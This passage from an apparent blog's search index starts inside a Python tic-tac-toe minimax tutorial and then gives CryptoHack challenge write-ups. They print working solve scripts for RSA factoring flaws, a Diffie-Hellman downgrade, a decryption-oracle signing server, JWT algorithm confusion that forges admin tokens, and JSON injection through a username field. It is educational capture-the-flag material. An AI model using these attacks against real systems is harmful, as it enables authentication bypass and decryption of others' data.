game_board==0: game_board=self.board for i in game_board: if i.count(&quot;X&quot;)==3: return 0 elif i.count(&quot;O&quot;)==3: return 1 if (game_board[0][0]==&quot;X&quot; and game_board[0][1]==&quot;X&quot; and game_board[0][2]==&quot;X&quot;) or (game_board[1][0]==&quot;X&quot; and game_board[1][1]==&quot;X&quot; and game_board[1][2]==&quot;X&quot;) or (game_board[2][0]==&quot;X&quot; and game_board[2][1]==&quot;X&quot; and game_board[2][2]==&quot;X&quot;): return 0 elif (game_board[0][0]==&quot;O&quot; and game_board[0][1]==&quot;O&quot; and game_board[0][2]==&quot;O&quot;) or (game_board[1][0]==&quot;O&quot; and game_board[1][1]==&quot;O&quot; and game_board[1][2]==&quot;O&quot;) or (game_board[2][0]==&quot;O&quot; and game_board[2][1]==&quot;O&quot; and game_board[2][2]==&quot;O&quot;): return 1 if (game_board[0][0]==&quot;X&quot; and game_board[1][1]==&quot;X&quot; and game_board[2][2]==&quot;X&quot;) or (game_board[0][2]==&quot;X&quot; and game_board[1][1]==&quot;X&quot; and game_board[2][0]==&quot;X&quot;): return 0 elif (game_board[0][0]==&quot;O&quot; and game_board[1][1]==&quot;O&quot; and game_board[2][2]==&quot;O&quot;) or (game_board[0][2]==&quot;O&quot; and game_board[1][1]==&quot;O&quot; and game_board[2][0]==&quot;O&quot;): return 1 if (game_board[0][0]==&quot;X&quot; and game_board[1][0]==&quot;X&quot; and game_board[2][0]==&quot;X&quot;) or (game_board[0][1]==&quot;X&quot; and game_board[1][1]==&quot;X&quot; and game_board[2][1]==&quot;X&quot;) or (game_board[0][2]==&quot;X&quot; and game_board[1][2]==&quot;X&quot; and game_board[2][2]==&quot;X&quot;): return 0 elif (game_board[0][0]==&quot;O&quot; and game_board[1][0]==&quot;O&quot; and game_board[2][0]==&quot;O&quot;) or (game_board[0][1]==&quot;O&quot; and game_board[1][1]==&quot;O&quot; and game_board[2][1]==&quot;O&quot;) or (game_board[0][2]==&quot;O&quot; and game_board[1][2]==&quot;O&quot; and game_board[2][2]==&quot;O&quot;): return 1 if self.is_full(): return 3 return -1We return 0 if player 1 won, 1 if player 2 won, 3 if the gameboard is full (tie) and -1 if nobody won.We check if the gameboard is full with the “is_full()” function :def is_full(self,game_board=0): if game_board==0: game_board=self.board for i in game_board: if i.count(-1)!=0: return False return TrueLet’s look at our different steps and now we just have to do the same thing again but for the next player!We can therefore launch our game in the following way:play=Game()while True: for event in pygame.event.get(): if event.type==pygame.QUIT: exit() lines(play.screen) play.show_board() pygame.display.update() play.add_piece(play.player_number) state=play.check_win() play.player_number=(play.player_number+1)%2 #We add 1 to the player number to change the turn. my_font = pygame.font.SysFont(&#39;Comic Sans MS&#39;, 140) if state!=-1: print(f&quot;Player {state+1} won !&quot; if state!=3 else &quot;Tie !&quot;) play.show_board() if state==0: text_surface = my_font.render(&#39;You won&#39;, False, (255, 255, 255)) elif state==1: text_surface = my_font.render(&#39;AI won&#39;, False, (255,255,255)) else: text_surface = my_font.render(&#39;Tie&#39;, False, (255, 255 ,255)) Game.screen.blit(text_surface, (150,150)) pygame.display.update() sleep(5) breakWe have a tic tac toe game !The minimax algorithmThe implementation is quite simple.We check all the possibilities. One player will maximize and the other one wil minimize. What does that mean ?After checking a possibilities, if this possibilities result of a win for us and we are maximazing so this possibilities will be qual to +1. If a possibilities result of a loose for us, this possibilities will be equel to -1.In case of a tie, the possibilities will be equal to 0.Because we are maximazing, we will choose a random a possibility equal to +1.Look at this image to understand better (The exemple maximize with +10 and minimize with -10 but it’s exactly the same ):def MM(self, game_board, is_maximazing,player_number): won=self.check_win(game_board) if won==0: #P0 won -&amp;gt; maximazing return 1,0 if won==1: #P1 won -&amp;gt; minimazing return -1,0 elif self.is_full(game_board): #Tie -&amp;gt; neutral return 0,0 if is_maximazing: best_moove_number = float(&#39;-inf&#39;) best_move = (0,0) possibles_mooves = self.get_possible_places(game_board) for (line, col) in possibles_mooves: temp_board = copy.deepcopy(game_board) temp_board[line][col]=&#39;X&#39; if player_number==0 else &quot;O&quot; MM_status = self.MM(temp_board, False,(player_number+1)%2)[0] print(MM_status) if MM_status &amp;gt; best_moove_number: best_moove_number = MM_status best_move = (line, col) return best_moove_number, best_move elif (is_maximazing)==False: best_moove_number = float(&#39;+inf&#39;) best_move = (0,0) possibles_mooves =self.get_possible_places(game_board) for (line, col) in possibles_mooves: temp_board = copy.deepcopy(game_board) temp_board[line][col]=&#39;X&#39; if player_number==0 else &quot;O&quot; MM_status = self.MM(temp_board, True,(player_number+1)%2)[0] print(MM_status) if MM_status &amp;lt; best_moove_number: best_moove_number = MM_status best_move = (line, col) return best_moove_number, best_moveMM take as argument a gameboard, True or False (if we are maximazing or not) and the current player number.The function will call itself recursively and generate a new board until it gets a win, then choose the best move based on the current state.Here, we use get_possible_places() to get all available boxes of a gameboard.def get_possible_places(self,game_board): places=[] for i in range(len(game_board)): for j in range(len(game_board[i])): if game_board[i][j]==-1: places.append((i,j)) return placesWe also use copy.deepcopy(game_board) to copy the current gameboard and modify it without changing the current board. Because with python if you make gameboard2=gameboard and you modify gameboard2 then gameboard can also be modified.ConclusionThe complete code source is available on my github !" }, { "title": "CryptoHack - Ron was Wrong, Whit is Right", "url": "/posts/ronwaswrong/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, factorization", "date": "2022-06-26 00:00:00 +0000", "snippet": "Instructions :Here’s a bunch of RSA public keys I gathered from people on the net together with messages that they sent.As excerpt.py shows, everyone was using PKCS#1 OAEP to encrypt their own messages. It shouldn’t be possible to decrypt them, but perhaps there are issues with some of the keys?Challenge files: excerpt.py keys_and_messages.zipResources: The recent difficulties with RSASolution :By reading the given article we discover the investigation of 6 researchers. In fact, theses researchers collected millions of RSA key on internet.They calculated the Greatest common divisor of all key. In fact, if two keys are prime to each other the GCD is 1. If the GCD is not 1, it’s mean that the keys share one factor !Because having tso huge primes factor is hard, a lot of peoples reuse known prime number.We can not factorize all the key because they are to big, but if we know that two key share one factor, we can deduce p and q.Let’s have a look with a little exemple :Imagine that we have a public key that is 35 and another one that is 77.If we imagine that 35 and 77 are too big to be factorized, we can try calculate the gcd of these numbers.The GCD of 35 and 77 is equal to 7. That’s mean that 35 = 7*x and 77 = 7*x.We can find the x easily because 35/7=x and 77/7=x.We have respectively 5 and 11.Now, we know that 35 = 7 * 5 and 77 = 7*11 because these two numbers are not prime among themselves.In the challenge, 50 public keys are provided. If we find two numbers whose GCD is different from 1, we can find p and q exactly as we did before. Then we can compute phi which is (p-1)*(q-1) and calculate d two decrypt the message.Let’s do it with python :from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPfrom math import gcdn=[]c=[]e=[]for i in range(1, 51): key = RSA.importKey(open(f&quot;{i}.pem&quot;, &#39;r&#39;).read()) cipher = open(f&quot;{i}.ciphertext&quot;, &#39;r&#39;).read() n.append(key.n) # we load all keys c.append(cipher) e.append(key.e)N = 0for i in range(len(n)): for j in range(i,len(n)): tmp = gcd(n[i], n[j]) if tmp != 1 and n[i]!=n[j]: # if a GCD if different from 1, we stock it. N =tmp index = ie = e[index] factor_1 = N #First factor is the GCD of numbers who are sharing a common factor. (p)factor_2 = n[index]//N #We find the second factor (q)phi = (factor_1-1)*(factor_2-1) #we calculate phid = pow(e,-1, phi) #Then dkey = RSA.construct((n[index], e, d)) #We decipher the textcipher = PKCS1_OAEP.new(key)decrypt = cipher.decrypt(bytes.fromhex(c[index]))" }, { "title": "CryptoHack - Fast Primes", "url": "/posts/fast-prime/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, ROCA", "date": "2022-06-26 00:00:00 +0000", "snippet": "Instructions :I need to produce millions of RSA keys quickly and the standard way just doesn’t cut it. Here’s yet another fast way to generate primes which has actually resisted years of review.Challenge files: fast_primes.py key.pem ciphertext.txtfast_primes.py#!/usr/bin/env python3import mathimport randomfrom Crypto.Cipher import PKCS1_OAEPfrom Crypto.PublicKey import RSAfrom Crypto.Util.number import bytes_to_long, inversefrom gmpy2 import is_primeFLAG = b&quot;crypto{????????????}&quot;primes = []def sieve(maximum=10000): # In general Sieve of Sundaram, produces primes smaller # than (2*x + 2) for a number given number x. Since # we want primes smaller than maximum, we reduce maximum to half # This array is used to separate numbers of the form # i+j+2ij from others where 1 &amp;lt;= i &amp;lt;= j marked = [False]*(int(maximum/2)+1) # Main logic of Sundaram. Mark all numbers which # do not generate prime number by doing 2*i+1 for i in range(1, int((math.sqrt(maximum)-1)/2)+1): for j in range(((i*(i+1)) &amp;lt;&amp;lt; 1), (int(maximum/2)+1), (2*i+1)): marked[j] = True # Since 2 is a prime number primes.append(2) # Print other primes. Remaining primes are of the # form 2*i + 1 such that marked[i] is false. for i in range(1, int(maximum/2)): if (marked[i] == False): primes.append(2*i + 1)def get_primorial(n): result = 1 for i in range(n): result = result * primes[i] return resultdef get_fast_prime(): M = get_primorial(40) while True: k = random.randint(2**28, 2**29-1) a = random.randint(2**20, 2**62-1) p = k * M + pow(e, a, M) if is_prime(p): return psieve()e = 0x10001m = bytes_to_long(FLAG)p = get_fast_prime()q = get_fast_prime()n = p * qphi = (p - 1) * (q - 1)d = inverse(e, phi)key = RSA.construct((n, e, d))cipher = PKCS1_OAEP.new(key)ciphertext = cipher.encrypt(FLAG)assert cipher.decrypt(ciphertext) == FLAGexported = key.publickey().export_key()with open(&quot;key.pem&quot;, &#39;wb&#39;) as f: f.write(exported)with open(&#39;ciphertext.txt&#39;, &#39;w&#39;) as f: f.write(ciphertext.hex())Solution :We find that M is a factor of P. M is “get_primorial(40)” which is always the same number. Both p and q will share a same factor : M. I searched a lot on internet and i have found the “roca” attack.Using RSACtfTool we break the key easily because n is simply broken… We do not even need the roca attack, using factordb we get p et q. With p and q we can have phi and the deciphered text.┌──(kali㉿kali)-[~/RsaCtfTool]└─$ ./RsaCtfTool.py --publickey ../key --uncipher 1917684880911867693650685352418976984109248146699653008498254042568729095851205293666079588834526955087298417903949404082481371089615961547716198943362344private argument is not set, the private key will not be displayed, even if recovered.[*] Testing key ../key.[*] Performing mersenne_primes attack on ../key. 24%|███████████████████████████████████████████▌ | 12/51 [00:00&amp;lt;00:00, 284359.59it/s][*] Performing smallq attack on ../key.[*] Performing system_primes_gcd attack on ../key.100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 7007/7007 [00:00&amp;lt;00:00, 1006489.32it/s][*] Performing nonRSA attack on ../key.[*] Performing factordb attack on ../key.[*] Attack success with factordb method !Results for ../key:Unciphered data :HEX : 0xdb399aa127be4ae31fd97c20254718b33cc2f38727abdddeabc924cd254153291d9eb63729823bca6ff327f1714ec9342fdd0cf37a801388793e3b23d4fb28INT (big endian) : 44850569214881713558668609493518231482054817376499457246532789308666571922968123835475628673877508976972939359835932184080315801143996699673272167758632INT (little endian) : 8384729834905722449278043599998413844644268058872587209088863552570247949756796080837921964555071830136422457171642997288486478561051877581061327829467STR : b&quot;\\xdb9\\x9a\\xd9| %G\\x18\\xb3&amp;lt;\\xc2\\xf39$\\xcd%AS)\\x1d\\x9e\\xb67)\\x82;\\xcao\\xf3&#39;\\xf1qN\\xc94/\\xdd\\x0c\\xf3z\\x88y&amp;gt;;#\\xd4\\xfb(&quot;HEX : 0x637279...537306e31347dINT (big endian) : 567742950117184...32502550066638173309INT (little endian) : 714787567...60602219549596153741406819utf-8 : [FLAG]utf-16 : 牣灹ㅮ紴STR : [FLAG]HEX : 0x00db399aa127be4ae31fd97...823bca6ff327f1714ec9342fdd0cf37a801388793e3b23d4fb28INT (big endian) : 44850569214881713558...46532789308666571922968123835475628673877508976972939359835932184080315801143996699673272167758632INT (little endian) : 2146490837735864947...593944228932623071382325526749069457983475137739796694508022926098388514924149035940607305852538511629280660751699924343552STR : b&quot;\\x00\\&amp;lt;\\\\xf3\\x87&#39;\\xab\\xdd\\xde\\xab\\xc9$\\xcd%AS)\\x1d\\x9e\\xb67)\\x82;\\xcao\\xf3&#39;\\xf1qN\\xc94/\\xdd\\x0c\\xf3z\\x80\\x13\\x#\\xd4\\xfb(&quot; " }, { "title": "CryptoHack - Export Grade", "url": "/posts/export-grade/", "categories": "CryptoHack", "tags": "Challenge, AES, crypto, Diffie-Hellman, MITM, Discrete logarithm", "date": "2022-06-26 00:00:00 +0000", "snippet": "Instructions :Alice and Bob are using legacy codebases and need to negotiate parameters they both support. You’ve man-in-the-middled this negotiation step, and can passively observe thereafter. How are you going to ruin their day this time?Connect at nc socket.cryptohack.org 13379Solution :First step, we intercept this from Alice :Intercepted from Alice: {&quot;supported&quot;: [&quot;DH1536&quot;, &quot;DH1024&quot;, &quot;DH512&quot;, &quot;DH256&quot;, &quot;DH128&quot;, &quot;DH64&quot;]}I did some tests and Bob will always chose the DH with the highest number. I tried all possibilites and i understood that the number after “DH” correspond to the number of bits of the key.If we can choose the numbre of bit of the key, of course we choose the lowest one to crack it after.So we send to alice :{&quot;supported&quot;: [&quot;DH64&quot;]}Now, we know that the key will be 64bits long.Reminder of Diffie-hellman :The complexity of Diffie-Helman is that we can not guess Alice &amp;amp; Bob private keys. We also can not bruteforce keys because with a 2048 bits key we have 22048 possibilities and that is enormous.Here, we have a 64 bits key, we have 264 possibilities which is pretty small.Using Alpertron we can enter alice data to find her private key (because it’s a small one)We see that the alice private key is7628428214974869407Alice will get the shared private key by calculating BAlice key mod p.We have all these information !We now have to calculate this shared secret and we can decode the data using the “Starter 5” function :from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#39;ascii&#39;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#39;ascii&#39;) else: return plaintext.decode(&#39;ascii&#39;)shared_secret = pow(5545560548494452803,7628428214974869407,16007670376277647657)iv = &quot;6a55f3d640455efdbba5fe16007608bb&quot;ciphertext = &quot;920158159e41a3acf36203e521a2a64114baeb848a186144cf9510e42c0ac380&quot;print(decrypt_flag(shared_secret, iv, ciphertext))" }, { "title": "CryptoHack - Signing Server", "url": "/posts/signing-server/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, sign", "date": "2022-06-25 00:00:00 +0000", "snippet": "Instructions :My boss has so many emails he’s set up a server to just sign everything automatically. He also stores encrypted messages to himself for easy access. I wonder what he’s been saying.Connect at nc socket.cryptohack.org 13374Challenge files: 13374.py13374.py :#!/usr/bin/env python3from Crypto.Util.number import bytes_to_long, long_to_bytesfrom utils import listenerclass Challenge(): def __init__(self): self.before_input = &quot;Welcome to my signing server. You can get_pubkey, get_secret, or sign.\\n&quot; def challenge(self, your_input): if not &#39;option&#39; in your_input: return {&quot;error&quot;: &quot;You must send an option to this server&quot;} elif your_input[&#39;option&#39;] == &#39;get_pubkey&#39;: return {&quot;N&quot;: hex(N), &quot;e&quot;: hex(E) } elif your_input[&#39;option&#39;] == &#39;get_secret&#39;: secret = bytes_to_long(SECRET_MESSAGE) return {&quot;secret&quot;: hex(pow(secret, E, N)) } elif your_input[&#39;option&#39;] == &#39;sign&#39;: msg = int(your_input[&#39;msg&#39;], 16) return {&quot;signature&quot;: hex(pow(msg, D, N)) } else: return {&quot;error&quot;: &quot;Invalid option&quot;}listener.start_server(port=13374)Solution :This server is pretty strange… We can get the rsa public key, get a “secret message” and sign an hexadecimal string. The sign option is basically calculating message d mod n. The sign function will simply decipher the text previously entered.“get_secret” is calculating secrete mod n. So, “get_secret” give us a ciphered text and the sign function allow us to decipher a text ? We can ask the sign function to give us the secret text and decipher it with the sign function !Using python :from pwn import * # pip install pwntoolsimport jsonfrom Crypto.Util.number import long_to_bytesr = remote(&#39;socket.cryptohack.org&#39;, 13374, level = &#39;debug&#39;)def json_recv(): line = r.recvline() return json.loads(line.decode())def json_send(hsh): request = json.dumps(hsh).encode() r.sendline(request)r.recvline()json_send({&quot;option&quot;:&quot;get_secret&quot;})secret=json_recv()[&quot;secret&quot;][2:]json_send({&quot;option&quot;:&quot;sign&quot;,&quot;msg&quot;:secret})signature=json_recv()[&quot;signature&quot;][2:]sign_to_int=int(signature,16)print(long_to_bytes(sign_to_int))" }, { "title": "CryptoHack - Everything is still big", "url": "/posts/everything-is-still-big/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, sagemath, boneh-durfee", "date": "2022-06-25 00:00:00 +0000", "snippet": "Instructions :Okay so I got a bit carefree with my last script, but this time I’ve protected myself while keeping everything really big. Nothing will stop me and my supercomputer now!Challenge files: source.py output.txtResources: Twenty Years of Attacks on the RSA CryptosystemSolution :I read the given pdf and the fourth page caught my attention. The chapter “Low private exponent” talks about the risk of having a huge e. If e is big, d can be small mod n. Thanks to “boneh-durfee” attack we can retrieve d if it is small.I’ve found this repo on github.Let’s use sagemath and try to find d.d will be found if d&amp;lt;N0.292┌──(kali㉿kali)-[~]└─$ sage rsa_attack.sage=== checking values ===* delta: 0.180000000000000* delta &amp;lt; 0.292 True* size of e: 2045* size of N: 2046* m: 4 , t: 2=== running algorithm ===* removing unhelpful vector 06 / 18 vectors are not helpfuldet(L) &amp;lt; e^(m*n) (good! If a solution exists &amp;lt; N^delta, it will be found)00 X 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ~01 X X 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 02 0 0 X 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ~03 0 0 X X 0 0 0 0 0 0 0 0 0 0 0 0 0 0 04 0 0 X X X 0 0 0 0 0 0 0 0 0 0 0 0 0 05 0 0 0 0 0 X 0 0 0 0 0 0 0 0 0 0 0 0 ~06 0 0 0 0 0 X X 0 0 0 0 0 0 0 0 0 0 0 ~07 0 0 0 0 0 X X X 0 0 0 0 0 0 0 0 0 0 08 0 0 0 0 0 X X X X 0 0 0 0 0 0 0 0 0 09 0 0 0 0 0 0 0 0 0 X 0 0 0 0 0 0 0 0 ~10 0 0 0 0 0 0 0 0 0 X X 0 0 0 0 0 0 0 ~11 0 0 0 0 0 0 0 0 0 X X X 0 0 0 0 0 0 12 0 0 0 0 0 0 0 0 0 X X X X 0 0 0 0 0 13 0 0 0 0 0 0 0 0 0 X X X X X 0 0 0 0 14 X X 0 X X 0 0 0 0 0 0 0 0 0 X 0 0 0 15 0 0 X X X 0 X X X 0 0 0 0 0 0 X 0 0 16 0 0 0 0 0 X X X X 0 X X X X 0 0 X 0 17 0 0 X X X 0 X X X 0 0 X X X 0 X X X optimizing basis of the lattice via LLL, this can take a long timeLLL is done!looking for independent vectors in the latticefound them, using vectors 0 and 1=== solution found ===private key found: 1178047123867005117803610...829687625029129242589458595768537819428280893758899509=== 0.5668575763702393 seconds ===Voila, we have d !Now, we can decrypt the message with pythonfrom Cryptodome.PublicKey import RSAfrom Crypto.Util.number import long_to_bytesmessage=int(&#39;0x503d5dd3bf3d76918b868c0789c81b4a384184ddadef81142eabdcb78656632e54c9cb22ac2c41178607aa41adebdf89cd24ec1876365994f54f2b8fc492636b59382eb5094c46b5818cf8d9b42aed7e8051d7ca1537202d20ef945876e94f502e048ad71c7ad89200341f8071dc73c2cc1c7688494cad0110fca4854ee6a1ba999005a650062a5d55063693e8b018b08c4591946a3fc961dae2ba0c046f0848fbe5206d56767aae8812d55ee9decc1587cf5905887846cd3ecc6fc069e40d36b29ee48229c0c79eceab9a95b11d15421b8585a2576a63b9f09c56a4ca1729680410da237ac5b05850604e2af1f4ede9cf3928cbb3193a159e64482928b585ac&#39;,16)n=1291644713745307443546968884262229450843875129917053552876321008644191767256511128834777932397603711984969074559709840520428084122370851250973658415386...1841090057259646226194981126956532671953413964735202375312868160112350373415379463907794108927768398835451176758241138626065075767232526577752765330761267711167537861048249d=1178047123...5029129242589458595768537819428280893758899509decrypt=pow(message,d,n)print(long_to_bytes(decrypt))Another solution :Using factordb we discover that n is known and we have p and q. So we can deduce d." }, { "title": "CryptoHack - Marin&#39;s Secrets", "url": "/posts/cryptohack-marin-secret/", "categories": "CryptoHack", "tags": "Challenge, RSA, crypto, math, modular math, factorization", "date": "2022-06-24 00:00:00 +0000", "snippet": "Instructions :I’ve found a super fast way to generate primes from my secret list.Challenge files: marin.py output.txtmarin.py :#!/usr/bin/env python3import randomfrom Crypto.Util.number import bytes_to_long, inversefrom secret import secrets, flagdef get_prime(secret): prime = 1 for _ in range(secret): prime = prime &amp;lt;&amp;lt; 1 return prime - 1secrets = random.shuffle(secrets)m = bytes_to_long(flag)p = get_prime(secrets[0])q = get_prime(secrets[1])n = p * qe = 0x10001c = pow(m, e, n)print(f&quot;n = {n}&quot;)print(f&quot;e = {e}&quot;)print(f&quot;c = {c}&quot;)Solution :Here, we see that we can not guess these number because we do not know the values of the secret list.We can not guess p and q and we can not have any information about the key.Using factordb i searched for n and it was known !Luckily, we now have the factorized version of n. Because we have p and q we also have tot(n) by doing (p-1)*(q-1). Then we calculate d because d=e-1 mod tot(n).After what we can decipher text ! See more details about RSA hereWith python we get :from Crypto.Util.number import long_to_bytesq=pow(2,2203-1)p=pow(2,2281-1)tot=(p-1)*(q-1)cipher=40028046308893...981555179129287164971002033759724456e=65537n=658416274830184544125024117184808822828370900198489249243399165125219244753790779764466236965135793576516193213175061401...02259605109600363098950091998891375812839523613295667253813978434879172781217285652895469194181218343078754501694746598738215243769747956572555989594598180639098344891175879455994652382137038240166358066403475457d=pow(e,-1,tot)decrypt=pow(cipher,d,n)print(long_to_bytes(decrypt))" }, { "title": "CryptoHack - RSA or HMAC", "url": "/posts/rsa-or-hmac/", "categories": "Crypto", "tags": "Challenge, Cryptohack, JWT, JSON, crypto, web", "date": "2022-06-22 00:00:00 +0000", "snippet": "Challenge description :There&#39;s another issue caused by allowing attackers to specify their own algorithms but not carefully validating them. Attackers can mix and match the algorithms that are used to sign and verify data. When one of these is a symmetric algorithm and one is an asymmetric algorithm, this creates a beautiful vulnerability.The server is running PyJWT with a small patch to enable an exploit that existed in PyJWT versions &amp;lt;= 1.5.0. To create the malicious signature, you will need to patch or downgrade your PyJWT library too. Use pip show pyjwt to find the location of the PyJWT library on your computer, and edit jwt/algorithms.py to remove the line that was added in the fix for the vulnerability.Play at http://web.cryptohack.org/rsa-or-hmacSource code :import jwt # note this is the PyJWT module, not python-jwt# Key generated using: openssl genrsa -out rsa-or-hmac-private.pem 2048with open(&#39;challenge_files/rsa-or-hmac-private.pem&#39;, &#39;rb&#39;) as f: PRIVATE_KEY = f.read()with open(&#39;challenge_files/rsa-or-hmac-public.pem&#39;, &#39;rb&#39;) as f: PUBLIC_KEY = f.read()FLAG = ?@chal.route(&#39;/rsa-or-hmac/authorise/&amp;lt;token&amp;gt;/&#39;)def authorise(token): try: decoded = jwt.decode(token, PUBLIC_KEY, algorithms=[&#39;HS256&#39;, &#39;RS256&#39;]) except Exception as e: return {&quot;error&quot;: str(e)} if &quot;admin&quot; in decoded and decoded[&quot;admin&quot;]: return {&quot;response&quot;: f&quot;Welcome admin, here is your flag: {FLAG}&quot;} elif &quot;username&quot; in decoded: return {&quot;response&quot;: f&quot;Welcome {decoded[&#39;username&#39;]}&quot;} else: return {&quot;error&quot;: &quot;There is something wrong with your session, goodbye&quot;}@chal.route(&#39;/rsa-or-hmac/create_session/&amp;lt;username&amp;gt;/&#39;)def create_session(username): encoded = jwt.encode({&#39;username&#39;: username, &#39;admin&#39;: False}, PRIVATE_KEY, algorithm=&#39;RS256&#39;) return {&quot;session&quot;: encoded}@chal.route(&#39;/rsa-or-hmac/get_pubkey/&#39;)def get_pubkey(): return {&quot;pubkey&quot;: PUBLIC_KEY}SolutionFirst, i patched by JWT asit’s requested in the description.First of all, I noticed something strange. The token is encoded in “RS256” but the decode function accept both ‘RS256’ and ‘HS256’ algorithms. Why? If we encode data with one algorithm we need to decode this data with the same algorithm.After that, i noticed that the “PUBLIC KEY” is at the second place in the decode function. The second parameter is also where we write the “secret key” for an HS256 algorithm.We can have the public key thanks to get_pubkey().We can create a token using HS256 alorithm and sign it with the public key as a secret key ! When the website will receive our token. It will decode our token and see that it’s HS256 encoded. It will use the second parameter (public_key) to check if the token is well signed. Because we used this key to sign our payload it will be correct !I explain more how JWT works in this write upThe decoded payload parts is :{&quot;username&quot; : &quot;admin&quot;,&quot;admin&quot; : &quot;False&quot;}With python we will generate a token with the same json but we will only replace “admin” : “False” by “admin” : “True”import requestsimport jwt #I patched my JWT as they said.import jsonURL = &#39;http://web.cryptohack.org//&#39;def get_pub_key(): #Get the RSA public key req=requests.get(URL+f&#39;/rsa-or-hmac/get_pubkey&#39;) data=json.loads(req.text)[&#39;pubkey&#39;] return datadef login(): pub_key=get_pub_key() token=jwt.encode({&#39;username&#39;:&#39;admin&#39;,&#39;admin&#39;:&#39;true&#39;},pub_key,&#39;HS256&#39;) #Encoding this payload in HS256 with the public key as secret. return tokenNow, we have our admin crafted token !" }, { "title": "CryptoHack - JSON in JSON", "url": "/posts/json-in-json/", "categories": "Crypto", "tags": "Challenge, Cryptohack, JWT, JSON, crypto, web", "date": "2022-06-22 00:00:00 +0000", "snippet": "Challenge description :We&#39;ve explored how flawed verification can break the security of JWTs, but it can sometimes be possible to exploit the code to sign unexpected data in the first place.Play at http://web.cryptohack.org/json-in-jsonChallenge contributed by sublevel_1157The web app source code:import jsonimport jwt # note this is the PyJWT module, not python-jwtFLAG = ?SECRET_KEY = ?@chal.route(&#39;/json-in-json/authorise/&amp;lt;token&amp;gt;/&#39;)def authorise(token): try: decoded = jwt.decode(token, SECRET_KEY, algorithms=[&#39;HS256&#39;]) except Exception as e: return {&quot;error&quot;: str(e)} if &quot;admin&quot; in decoded and decoded[&quot;admin&quot;] == &quot;True&quot;: return {&quot;response&quot;: f&quot;Welcome admin, here is your flag: {FLAG}&quot;} elif &quot;username&quot; in decoded: return {&quot;response&quot;: f&quot;Welcome {decoded[&#39;username&#39;]}&quot;} else: return {&quot;error&quot;: &quot;There is something wrong with your session, goodbye&quot;}@chal.route(&#39;/json-in-json/create_session/&amp;lt;username&amp;gt;/&#39;)def create_session(username): body = &#39;{&#39; \\ + &#39;&quot;admin&quot;: &quot;&#39; + &quot;False&quot; \\ + &#39;&quot;, &quot;username&quot;: &quot;&#39; + str(username) \\ + &#39;&quot;}&#39; encoded = jwt.encode(json.loads(body), SECRET_KEY, algorithm=&#39;HS256&#39;) return {&quot;session&quot;: encoded}Solution :First, i noticed that unlike previous challenges, we do not have any misconfiguration (e.g: Double encoding, etc.). The only one entry point we have is the “username” field.Our username is directly written into json and encoded as JWT payload.Here is the json code. &#39;{&#39; \\ + &#39;&quot;admin&quot;: &quot;&#39; + &quot;False&quot; \\ + &#39;&quot;, &quot;username&quot;: &quot;&#39; + str(username) \\ + &#39;&quot;}&#39;What can we write as username to become admin ?If we inject “admin”:”True” the value of admin will be overwritten.Let’s try differents payloadx.I succeed with this one : admin”,”admin”:”TrueAt the end we have for json :{‘ + ‘“admin”: “’ + “False” + ‘”, “username”: “’ + str(admin”,”admin”:”True) + ‘”}’Json encoded will be :{ &quot;admin&quot;: &quot;False&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;admin&quot;:&quot;True&quot;}We can generate our token and send it to get the flag." }, { "title": "CryptoHack - Diffie-Hellman Starter 5", "url": "/posts/starter-5/", "categories": "CryptoHack", "tags": "Challenge, AES, crypto, Diffie-Hellman", "date": "2022-06-21 00:00:00 +0000", "snippet": "challenge link : https://cryptohack.org/courses/public-key/dh-starter-5/Instruction :We have p which is the mod and and g which is our base.Alice wants to send you her secret flag and asks you to generate a shared secret with her. She also tells you she will be using the NIST standard:g: 2p: 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919You receive the following integer from Alice:A: 112218739139542908880564359534373424013016249772931962692237907571990334483528877513809272625610512061159061737608547288558662879685086684299624481742865016924065000555267977830144740364467977206555914781236397216033805882207640219686011643468275165718132888489024688846101943642459655423609111976363316080620471928236879737944217503462265615774774318986375878440978819238346077908864116156831874695817477772477121232820827728424890845769152726027520772901423784You then generate your secret integer and calculate your public one, which you send to Alice.b: 197395083814907028991785772714920885908249341925650951555219049411298436217190605190824934787336279228785809783531814507661385111220639329358048196339626065676869119737979175531770768861808581110311903548567424039264485661330995221907803300824165469977099494284722831845653985392791480264712091293580274947132480402319812110462641143884577706335859190668240694680261160210609506891842793868297672619625924001403035676872189455767944077542198064499486164431451944B: 1241972460522075344783337556660700537760331108332735677863862813666578639518899293226399921252049655031563612905395145236854443334774555982204857895716383215705498970395379526698761468932147200650513626028263449605755661189525521343142979265044068409405667549241125597387173006460145379759986272191990675988873894208956851773331039747840312455221354589910726982819203421992729738296452820365553759182547255998984882158393688119629609067647494762616719047466973581Individually you each use the shared secret to derive an AES private key. This allows you to encrypt large amounts of data over your channel without needing to exchange keys again.Alice sends you the following IV and ciphertext:{&#39;iv&#39;: &#39;737561146ff8194f45290f5766ed6aba&#39;, &#39;encrypted_flag&#39;: &#39;39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c&#39;}Decrypt this to obtain your flag!source.pydecrypt.pyInside “decrypt.py” we have a function to decrypt text with IV, key and ciphertextSolution :We have 